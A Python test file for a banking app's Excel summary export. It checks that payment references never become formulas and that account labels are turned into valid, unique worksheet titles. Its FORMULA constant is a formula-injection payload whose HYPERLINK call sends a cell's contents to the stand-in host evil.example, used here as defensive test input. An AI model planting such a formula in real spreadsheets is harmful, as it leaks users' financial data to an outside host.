"""The p4x summary workbooks never turn a booking's payment reference into a
formula, no matter what a bank transfer's free-text reference field says, and
every account label gives a valid worksheet title."""

import io
import zipfile
from datetime import date

import pytest
from openpyxl import load_workbook

from app.models.p4x_account import P4xAccount
from app.models.p4x_transaction import P4xTransaction
from app.services.p4x_summary_service import generate_summary_xlsx
from tests.p4x.test_p4x_service_queries import _add_tx, _now
from tests.p4x.test_p4x_summary import _seed

FORMULA = '=HYPERLINK("http://evil.example/?x="&C2,"Beleg")'


class TestSummaryWorkbookHasNoFormulas:
    def test_payment_reference_stays_text(self, db_session):
        _seed(db_session)
        tx = (
            db_session.query(P4xTransaction).filter_by(sha256_hash="summary_tx_1").one()
        )
        tx.subject = FORMULA
        db_session.commit()

        raw, _attachments = generate_summary_xlsx(
            db_session, date(2026, 3, 1), date(2026, 3, 31)
        )

        with zipfile.ZipFile(io.BytesIO(raw)) as archive:
            sheets = [n for n in archive.namelist() if n.startswith("xl/worksheets/")]
            assert all(b"<f>" not in archive.read(n) for n in sheets)


def _account_sheet_names(db_session) -> list[str]:
    raw, _attachments = generate_summary_xlsx(
        db_session, date(2026, 3, 1), date(2026, 3, 31)
    )
    return load_workbook(io.BytesIO(raw)).sheetnames


def _relabel_seeded_account(db_session, label: str | None) -> None:
    account = _seed(db_session)
    account.label = label
    db_session.commit()


class TestSummaryWorksheetTitles:
    def test_a_plain_label_is_kept(self, db_session):
        _seed(db_session)

        assert "Girokonto" in _account_sheet_names(db_session)

    def test_a_label_with_forbidden_characters_gives_a_valid_sheet(self, db_session):
        _relabel_seeded_account(db_session, "Konto/2026: [alt]")

        assert "Konto 2026   alt" in _account_sheet_names(db_session)

    @pytest.mark.parametrize("character", list("[]:*?/\\"))
    def test_each_forbidden_character_becomes_a_blank(self, db_session, character):
        _relabel_seeded_account(db_session, f"A{character}B")

        assert "A B" in _account_sheet_names(db_session)

    @pytest.mark.parametrize("label", [None, "", "   ", "///", "[:]"])
    def test_a_label_without_usable_characters_falls_back_to_a_name(
        self, db_session, label
    ):
        _relabel_seeded_account(db_session, label)

        assert "Konto" in _account_sheet_names(db_session)

    def test_a_long_label_is_cut_to_the_31_characters_of_a_title(self, db_session):
        _relabel_seeded_account(db_session, "x" * 32)

        assert "x" * 31 in _account_sheet_names(db_session)

    def test_labels_that_give_the_same_title_still_get_one_sheet_each(self, db_session):
        first = _seed(db_session)
        first.label = "A/B"
        second = P4xAccount(
            iban="AT611904300234573201",
            bic="BKAUATWWXXX",
            label="A:B",
            init_date=date(2015, 1, 1),
            init_balance=0,
            created_at=_now(),
            updated_at=_now(),
        )
        db_session.add(second)
        db_session.commit()
        _add_tx(db_session, second, date(2026, 3, 5), 1.0, hash_suffix="second")

        names = _account_sheet_names(db_session)

        assert len([name for name in names if name.startswith("A B")]) == 2
